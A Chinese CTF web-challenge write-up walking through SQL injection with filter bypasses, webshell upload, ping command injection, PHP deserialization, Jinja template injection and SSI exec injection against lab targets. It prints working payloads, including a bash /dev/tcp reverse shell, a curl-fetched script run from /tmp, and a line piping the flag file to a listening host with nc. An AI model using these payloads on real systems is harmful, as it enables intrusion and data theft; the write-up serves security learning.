href="#sql注入-1" class="headerlink" title="sql注入-1"></a>sql注入-1</h2><p>主页是这个样子</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509165223.png"></p><blockquote><p>判断注入类型    字符型    单引号</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1' and 1=1--+id=1' and 1=2--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>判断列数    三列</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=-1' order by 3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查询是否有显示位    union联合查询注入    2、3号位</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=-1 union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查询数据库    informaion_schema、note</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=-1' union select 1,(select concat(schema_name) from information_schema.schemata limit 0,1),3--+id=-1' union select 1,(select concat(schema_name) from information_schema.schemata limit 1,1),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>查询表（note）    fl4g、notes  </p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=-1' union select 1,(select concat(table_name) from information_schema.tables where table_schema='note' limit 0,1),3--+id=-1' union select 1,(select concat(table_name) from information_schema.tables where table_schema='note' limit 1,1),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>查询字段（fl4g）fllllag</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=-1' union select 1,(select concat(column_name) from information_schema.columns where table_name='FL4G' limit 0,1),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>dump数据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=-1' union select 1,(select fllllag from fl4g),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509170726.png"></p><h2 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入-2"></a>sql注入-2</h2><p>根据网页源代码hint添加get型参数tips</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509170912.png"></p><p>bp抓包，可以发现存在两个post型参数，name和pass，尝试了一番union联合查询注入，无法利用，遂改报错注入，这里使用updatexml</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509171448.png"></p><p>发现可以正常注入</p><pre class="line-numbers language-none"><code class="language-none">name=admin' and updatexml(1,concat(0x7e,(select 1),0x7e),1)#&amp;pass=111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查当前数据库    note</p></blockquote><pre class="line-numbers language-none"><code class="language-none">name=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;pass=111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查表（note）    fl4g</p></blockquote><pre class="line-numbers language-none"><code class="language-none">name=admin' and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema='note' limit 0,1),0x7e),1)#&amp;pass=111111//失败，可能过滤了一些字符name=admin' and updatexml(1,concat(0x7e,(seselectlect concat(table_name) from information_schema.tables where table_schema='note' limit 0,1),0x7e),1)#&amp;pass=111111//双写select绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>查字段（fl4g）    flag</p></blockquote><pre class="line-numbers language-none"><code class="language-none">name=admin' and updatexml(1,concat(0x7e,(seselectlect concat(column_name) from information_schema.columns where table_name='fl4g' limit 0,1),0x7e),1)#&amp;pass=111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>dump数据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">name=admin' and updatexml(1,concat(0x7e,(seselectlect flag from fl4g),0x7e),1)#&amp;pass=111111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509172815.png"></p><h2 id="Injection-V2-0"><a href="#Injection-V2-0" class="headerlink" title="Injection V2.0"></a>Injection V2.0</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510201312.png"></p><p>是个登陆框，有两个post的参数，user和pass，先尝试使用一般的联合查询</p><pre class="line-numbers language-none"><code class="language-none">user=admin' and 1=2#&amp;pass=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510201455.png"></p><p>他过滤了一些东西，把空格换成/**/</p><p>继续</p><pre class="line-numbers language-none"><code class="language-none">user=admin'/**/and/**/1=2#&amp;pass=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510201601.png"></p><pre class="line-numbers language-none"><code class="language-none">user=admin'/**/and/**/1=1#&amp;pass=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510201622.png"></p><p>可以看到返回了两种不同的状态</p><ul><li>用户不存在=&gt;False</li><li>密码错误=&gt;True</li></ul><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510201903.png"></p><p>返回密码错误，也就是True</p><blockquote><p>查询显示位置</p></blockquote><pre class="line-numbers language-none"><code class="language-none">user=admin'/**/union/**/select/**/1#&amp;pass=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510202141.png"></p><p>变成了，这个玩意儿，显然不是我想要的结果，试着双写下admin或者改成1，得到flag</p><pre class="line-numbers language-none"><code class="language-none">user=admiadminn'/**/union/**/select/**/1#&amp;pass=1user=1'/**/union/**/select/**/1#&amp;pass=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510202242.png"></p><h2 id="CISCN2021-easy-sql"><a href="#CISCN2021-easy-sql" class="headerlink" title="CISCN2021-easy_sql"></a>CISCN2021-easy_sql</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515153538.png"></p><p>随便输入一些，发现是post注入，直接bp抓包，将数据包内容全部放到1.txt中，sqlmap跑起来</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r 1.txt --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210515153749909.png"></p><p>发现三种类型的注入，接着我们跑下数据库</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r 1.txt --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515153944.png"></p><p>继续，爆表试试</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r 1.txt --batch -D security --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210515154055917.png"></p><p>发现到这一步，sqlmap就跑不了了，所以后端php脚本肯定是过滤了某些字符串，手动测试下，这里使用报错注入来试一试</p><pre class="line-numbers language-none"><code class="language-none">uname=admin') and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210515154400058.png"></p><p>可以看到这里明显有一个过滤，waf过滤掉了information_schema库，所以需要information_shema bypass，使用join来绕过 用法join … using(xx)</p><p>先查询flag表中的字段，第一个字段id</p><pre class="line-numbers language-none"><code class="language-none">uname=admin') and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag a)c)))--+&amp;passwd=1111&amp;Submit=%E7%99%BB%E5%BD%95<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515160144.png"></p><p>第二个字段no</p><pre class="line-numbers language-none"><code class="language-none">uname=admin') and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag using(id))c)))--+&amp;passwd=1111&amp;Submit=%E7%99%BB%E5%BD%95<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515155819.png"></p><p>第三个字段</p><pre class="line-numbers language-none"><code class="language-none">uname=admin') and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag using(id,no))c)))--+&amp;passwd=1111&amp;Submit=%E7%99%BB%E5%BD%95<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515155913.png"></p><p>显然flag字段存在于第三个字段中</p><pre class="line-numbers language-none"><code class="language-none">a017ad0b-41f8-42b5-9c13-a2b67dc471d4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着可以回到sqlmap中继续跑下</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r 1.txt --batch -D security -T flag -C a017ad0b-41f8-42b5-9c13-a2b67dc471d4 --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515155006.png"></p><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><h2 id="Uploadddd"><a href="#Uploadddd" class="headerlink" title="Uploadddd"></a>Uploadddd</h2><p>扫目录，扫到了下面这些</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510203410.png"></p><p>下载下来index.php.swp</p><pre class="line-numbers language-none"><code class="language-none">vim -r index.php.swp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510205743.png"></p><p>上传shell.php</p><p><img src="C:/Users/Polaris/AppData/Roaming/Typora/typora-user-images/image-20210510211019744.png" alt="image-20210510211019744"></p><p>发现上传的文件被重命名了，还加了随机数</p><p>命名规则20210510131014xxx.php       0-999</p><p>直接bp爆破</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510211229.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510211244.png"></p><p>结果</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510211306.png"></p><p>蚁剑连接</p><pre class="line-numbers language-none"><code class="language-none">http://challenge-b5c838f39fbf7fd6.sandbox.ctfhub.com:10080/uploads/2021051013101469.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210510211501.png"></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="死亡ping命令"><a href="#死亡ping命令" class="headerlink" title="死亡ping命令"></a>死亡ping命令</h2><p>通过可以发现是存在一些黑名单过滤的，被拦截时候显示IP包含恶意字符。</p><p>利用fuzz的方式能够知道过滤了以下字符:</p><pre class="line-numbers language-none"><code class="language-none">["$", "{", "}", "`", ";", "&amp;", "|", "(", ")", "\"", "'", "~", "!", "@", "#", "%", "^", "*", "[", "]", "\\", ":", "-", "_"]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过%0a能够注入新的一条命令进行执行。</p><pre class="line-numbers language-none"><code class="language-none">POST /ping.php HTTP/1.1Host: testabc.com:53340Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 32ip=127.0.0.1%0awhoami&gt;/tmp/aaaaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于docker是没有bash、python程序的，并且sh反弹是不行的。</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目前是能通过折中的方式执行任意命令</p><pre class="line-numbers language-none"><code class="language-none">请求bash文件到tmp目录127.0.0.1%0acurl 10.211.55.2/1.sh &gt; /tmp/1.sh给bash加权限127.0.0.1%0achmod 777 /tmp/1.sh10.211.55.2的机器上进行监听8080端口nc -l 8080执行bash文件127.0.0.1%0ash /tmp/1.sh1.sh内容为lscat /FLAG | nc 10.211.55.2 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="2020-网鼎杯-青龙组-Web-AreUSerialz"><a href="#2020-网鼎杯-青龙组-Web-AreUSerialz" class="headerlink" title="2020-网鼎杯-青龙组-Web-AreUSerialz"></a>2020-网鼎杯-青龙组-Web-AreUSerialz</h2><p>打开就得到源码</p><blockquote><p>1.传入get参数str，执行反序列化。 </p><p>2.is_valid过滤：传入的string要是可见字符ascii值为32-125。 </p><p>3.$op：op”1”的时候会进入write方法处理，op”2”的时候进入read方法处理。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">&lt;?phpinclude("flag.php");highlight_file(__FILE__);class FileHandler {    protected $op;    protected $filename;    protected $content;    function __construct() {        $op = "1";        $filename = "/tmp/tmpfile";        $content = "Hello World!";        $this-&gt;process();    }    public function process() {        if($this-&gt;op == "1") {            $this-&gt;write();        } else if($this-&gt;op == "2") {            $res = $this-&gt;read();            $this-&gt;output($res);        } else {            $this-&gt;output("Bad Hacker!");        }    }    private function write() {        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {            if(strlen((string)$this-&gt;content) &gt; 100) {                $this-&gt;output("Too long!");                die();            }            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output("Successful!");            else $this-&gt;output("Failed!");        } else {            $this-&gt;output("Failed!");        }    }    private function read() {        $res = "";        if(isset($this-&gt;filename)) {            $res = file_get_contents($this-&gt;filename);        }        return $res;    }    private function output($s) {        echo "[Result]: &lt;br&gt;";        echo $s;    }    function __destruct() {        if($this-&gt;op === "2")            $this-&gt;op = "1";        $this-&gt;content = "";        $this-&gt;process();    }}function is_valid($s) {    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;}if(isset($_GET{'str'})) {    $str = (string)$_GET['str'];    if(is_valid($str)) {        $obj = unserialize($str);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用php&gt;7.1版本对类属性的检测不严格(对属性类型不敏感)</p><p>1.正常构造payload的话因为$op、$fliename、$content都是protected属性，序列化的的结果的属性名前面会有/00 <em>/00(或者%00</em> %00)，/00的ascii为0不可见的字符如下图，就会被is_valid方法拦下来。</p><p><img src="https://img1.3s78.com/codercto/7370b8dc588e505c9e209b032c824130" alt="[网鼎杯 2020 青龙组]AreUSerialz"></p><p>2.php&gt;7.1版本对类属性的检测不严格来绕过，将序列化里的portected属性换成public属性，就不会有/00。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528195924.png"></p><p>3.弱类型绕过</p><p>然后$obj = unserialize($str);会调用__destruct魔术方法，如果$op=</p><p>“2”的话就把$op=”1”</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528195938.png"></p><p>这时候要使op=”2”不成立且op==”2”成立，这里可以自己使用op等于整数2使得进入read方法里面。</p><p>构造payload</p><p>1.非预期的解法</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528195955.png"></p><p>2.通过 <a href="http://www.codercto.com/category/php.html">php</a> 伪协议读取</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528200004.png"></p><p>比赛的是通过读取/proc/self/cmdline下的配置文件得到网站的绝对路径然后通过 <a href="http://www.codercto.com/courses/a/5.html">php</a> 伪协议读取flag的</p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="aaa"><a href="#aaa" class="headerlink" title="aaa"></a>aaa</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519200824.png"></p><p>直接抓包，发现参数func，猜测调用date函数来显示关于时间的功能块</p><p>尝试使用传入一个函数file_get_contents来读取文件</p><p>payload (post)</p><pre class="line-numbers language-none"><code class="language-none">func=file_get_contents&amp;p=index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?php    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch",      "escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",      "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce",      "array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents"    );    function gettime($func, $p) {      $result = call_user_func($func, $p);      $a= gettype($result);      if ($a == "string") {        return $result;      } else {        return "";      }    }    class Test {      var $p = "Y-m-d h:i:s a";      var $func = "date";      function __destruct() {        if ($this-&gt;func != "") {          echo gettime($this-&gt;func, $this-&gt;p);        }      }    }    $func = $_REQUEST["func"];    $p = $_REQUEST["p"];    if ($func != null) {      $func = strtolower($func);      if (!in_array($func,$disable_fun)) {        echo gettime($func, $p);      }else {        die("Hacker...");      }    }  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现存在一个很强的黑名单，基本上过滤了已知的危险函数。。。</p><p>但是这个class有点意思：</p><pre class="line-numbers language-none"><code class="language-none">function gettime($func, $p) {        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == "string") {            return $result;        } else {return "";}    }    class Test {        var $p = "Y-m-d h:i:s a";        var $func = "date";        function __destruct() {            if ($this-&gt;func != "") {                echo gettime($this-&gt;func, $this-&gt;p);            }        }    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有对参数进行验证，可以进行绕过，</p><p>本地测试：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php function gettime($func, $p) {    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == "string") {        return $result;    } else {return "";}}class Test {    var $p = "ls";    var $func = "system";    function __destruct() {        if ($this-&gt;func != "") {            echo gettime($this-&gt;func, $this-&gt;p);        }    }}$a = new Test();echo serialize($a); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试发现可以执行命令：</p><p><a href="https://s1.ax1x.com/2020/05/18/YhXgVP.png"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="YhXgVP.png"></a></p><p>得到flag：</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">func=unserialize&amp;p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519201641.png"></p><h1 id="SSTI（服务器模板注入）"><a href="#SSTI（服务器模板注入）" class="headerlink" title="SSTI（服务器模板注入）"></a>SSTI（服务器模板注入）</h1><h2 id="2018-TokyoWesterns-Web-shrine"><a href="#2018-TokyoWesterns-Web-shrine" class="headerlink" title="2018-TokyoWesterns-Web-shrine"></a>2018-TokyoWesterns-Web-shrine</h2><p>右键查看源代码</p><pre class="line-numbers language-none"><code class="language-none">import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index():    return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine):    def safe_jinja(s):        s = s.replace('(', '').replace(')', '')        blacklist = ['config', 'self']        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__':    app.run(debug=True, port=80)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里过滤了()，config，self</p><p>这里我们绕过可以使用current_app这一类的全局函数</p><p>有两个函数包含了current_app ( url_for 和 get_flashed_messages )</p><p>尝试url_for，请求下面这个地址</p><pre class="line-numbers language-none"><code class="language-none">/shrine/{{url_for.__globals__}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529094916.png"></p><p>然后利用current_app调用config</p><pre class="line-numbers language-none"><code class="language-none">/shrine/{{url_for.__globals__['current_app'].config}}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529095229.png"></p><p>除此之外还可以使用get_flashed_messages</p><pre class="line-numbers language-none"><code class="language-none">/shrine/{{get_flashed_messages.__globals__}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529095426.png"></p><pre class="line-numbers language-none"><code class="language-none">/shrine/{{get_flashed_messages.__globals__['current_app'].config}}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529095521.png"></p><h1 id="SSI注入（服务端包含注入）"><a href="#SSI注入（服务端包含注入）" class="headerlink" title="SSI注入（服务端包含注入）"></a>SSI注入（服务端包含注入）</h1><h2 id="2020-BDJCTF-Web-easy-search"><a href="#2020-BDJCTF-Web-easy-search" class="headerlink" title="2020-BDJCTF-Web-easy_search"></a>2020-BDJCTF-Web-easy_search</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529100834.png"></p><p>是个登录框，不是sql注入，扫描目录发现</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529101020.png"></p><p>访问得到源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpob_start();function get_hash(){$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times$content = uniqid().$random;return sha1($content); }    header("Content-Type: text/html;charset=utf-8");***    if(isset($_POST['username']) and $_POST['username'] != '' )    {        $admin = '6d0bc1';        if ( $admin == substr(md5($_POST['password']),0,6)) {            echo "&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;";            $file_shtml = "public/".get_hash().".shtml";            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");            $text = '            ***            ***            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;            ******';            fwrite($shtml,$text);            fclose($shtml);            ***echo "[!] Header  error ...";        } else {            echo "&lt;script&gt;alert('[!] Failed')&lt;/script&gt;";                }else    {***    }***?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码提示说先随机获取一个文件名，使用md5加密password的前6个字符，使它等于6d0bc1，然后在public目录下创建.shtml文件，然后post一个参数username，写入这个shtml文件</p><pre class="line-numbers language-none"><code class="language-none">import hashlibdef md5(s):    return hashlib.md5(s.encode('utf-8')).hexdigest()for i in range(1, 10000000):    if md5(str(i)).startswith('6d0bc1'):        print(i)        break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529101532.png"></p><p>结果2020666</p><p>登陆进去</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529101749.png"></p><p>访问提示public/af1bdf1ee9ff5a277518b1456a14a965d0f853c5.shtml</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529102116.png"></p><p>利用SSI注入漏洞，我们可以在username变量中传入ssi语句来远程执行系统命令。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--#exec cmd="命令"--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（shtml是一种基于SSI技术的文件。SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p><p>（SSI注入的条件：</p><p>1.Web 服务器已支持SSI（服务器端包含）</p><p>2.Web 应用程序未对对相关SSI关键字做过滤</p><p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p><p>用户名输入</p><pre class="line-numbers language-none"><code class="language-none">&lt;!--#exec cmd="ls ../"--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>密码输入</p><pre class="line-numbers language-none"><code class="language-none">2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529102445.png"></p><p>登录，抓包，找到相应头中的url</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529102550.png"></p><p>访问public/eaad24c1a7ca429dc8145e6c7638840c799374c4.shtml</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529102639.png"></p><p>继续访问flag文件flag_990c66bf85a09c664f0b6741840499b2</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210529102709.png"></p><h1 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h1><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528194406.png"></p><p>啥也没有，我还以为是题目的问题。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528194529.png"></p><p>目录扫描一顿扫一无所获！！！</p><p>瞅一瞅浏览器的数据包？</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210528194636.png"></p><p>还真发现了flag，base64解码可得</p><h2 id="find-it（源码泄露）"><a href="#find-it（源码泄露）" class="headerlink" title="find_it（源码泄露）"></a>find_it（源码泄露）</h2><p>扫到robots.txt</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210513214412.png"></p><p>提示1ndex.php，直接访问该文件是不存在的，尝试.1ndex.php.swp，发现源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php $link = mysql_connect('localhost', 'ctfhub', 'ctfhub'); ?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Hello worldd!&lt;/title&gt;&lt;style&gt;body {background-color: white;text-align: center;padding: 50px;font-family: "Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif;}#logo {margin-bottom: 40px;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;img id="logo" src="logo.png" /&gt;&lt;h1&gt;&lt;?php echo "Hello My freind!"; ?&gt;&lt;/h1&gt;&lt;?php if($link) { ?&gt;&lt;h2&gt;I Can't view my php files?!&lt;/h2&gt;&lt;?php } else { ?&gt;&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;&lt;?php } ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen("flag.php","r") or die("Unable 2 open!");$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));$hack=fopen("hack.php","w") or die("Unable 2 